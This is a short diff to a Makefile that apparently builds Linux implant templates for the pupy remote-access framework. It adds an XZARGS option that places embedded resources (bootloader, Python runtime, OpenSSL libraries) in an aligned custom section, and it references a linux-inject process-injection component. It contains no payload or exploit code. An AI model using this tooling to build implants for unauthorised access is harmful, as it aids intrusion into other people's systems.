@@ -9,6 +9,8 @@ LIBPYTHON ?= $(shell /sbin/ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | h
 LIBCRYPTO ?= $(shell /sbin/ldconfig -p  | awk '/libcrypto.so.1.0.0/{print $$4}' | head -n 1)
 LIBSSL ?= $(shell /sbin/ldconfig -p  | awk '/libssl.so.1.0.0/{print $$4}' | head -n 1)
 
+XZARGS ?= "aligned(0x1000)" 'section(".xzrodata")'
+
 ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
 ifeq ($(ARCH),64)
 NAME := 64
@@ -64,13 +66,14 @@ resources/library_compressed_string.txt: ../gen_library_compressed_string.py res
 	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py
 
 resources_library_compressed_string_txt.c: ../gen_resource_header.py resources/library_compressed_string.txt resources/library.zip
-	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/library_compressed_string.txt
+	$(PYTHON) $(PFLAGS) ../gen_resource_header.py \
+		resources/library_compressed_string.txt $(XZARGS)
 
 resources/bootloader.pyc: ../gen_python_bootloader.py ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py
 	$(PYTHON) $(PFLAGS) ../gen_python_bootloader.py $(DEBUG_ADD)
 
 resources_bootloader_pyc.c: ../gen_resource_header.py resources/bootloader.pyc
-	$(PYTHON) $(PFLAGS) $+
+	$(PYTHON) $(PFLAGS) $+ $(XZARGS)
 
 linux-inject/%.o: linux-inject/%.c
 	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<
@@ -100,13 +103,13 @@ resources/library.zip: ../build_library_zip.py ../additional_imports.py
 	$(PYTHON) $(PFLAGS) $<
 
 resources_python27_so.c: ../gen_resource_header.py resources/python27.so
-	$(PYTHON) $(PFLAGS) $+
+	$(PYTHON) $(PFLAGS) $+ $(XZARGS)
 
 resources_libssl_so.c: ../gen_resource_header.py resources/libssl.so
-	$(PYTHON) $(PFLAGS) $+
+	$(PYTHON) $(PFLAGS) $+ $(XZARGS)
 
 resources_libcrypto_so.c: ../gen_resource_header.py resources/libcrypto.so
-	$(PYTHON) $(PFLAGS) $+
+	$(PYTHON) $(PFLAGS) $+ $(XZARGS)
 
 $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).lin: main_exe.o $(PYOBJS) $(COMMON_OBJS)
 	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)
